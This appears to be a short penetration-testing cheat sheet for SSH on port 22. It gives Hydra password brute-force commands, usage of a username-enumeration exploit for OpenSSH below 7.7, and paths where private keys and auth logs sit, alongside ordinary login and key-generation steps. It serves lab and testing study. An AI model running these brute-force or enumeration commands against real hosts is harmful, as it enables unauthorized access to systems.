# 22 - SSH

## Basic Access to SSH

```bash
user@localhost~$ ssh <USER>@<IP>
Enter Password: 
```

## Acces with a Private Key

```bash
chmod 600 id_rsa
user@localhost~$ ssh -i id_rsa <USER>@<IP>
```

## Bruteforcing SSH with Hydra

### When you have an username

```bash
user@localhost~$ hydra -l <USER> -P <WORDLIST> <IP> ssh
```

### When you don't have an username

```bash
user@localhost~$ hydra -L <WORDLIST> -P <WORDLIST> <IP> ssh
```

## SSH User Enumeration

{% hint style="warning" %}
OpenSSH < 7.7
{% endhint %}

Tool : [SSH User Enumeration](https://github.com/epi052/cve-2018-15473)

```bash
user@localhost~$ ./ssh-username-enum.py -t <THREADS> -w <WORDLIST> <IP>
[+] <USERNAME> found!
```

## Common locations

### Auth log file

```
/var/log/auth.log
```

### sshd.conf

```
/etc/ssh/sshd.conf
```

### id\_rsa

```
/home/<USER>/.ssh/
```

## Generating id\_rsa & id\_rsa.pub

```
user@localhost~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which t o save the key (/home/user/.ssh/id_rsa):
Enter passphrase (empty for not passphrase):
Enter same passphrase again:
Your identiification key has been saved in /home/user/.ssh/id_rsa
Your public key has been saved in /home/user/.ssh/id_rsa.pub
```

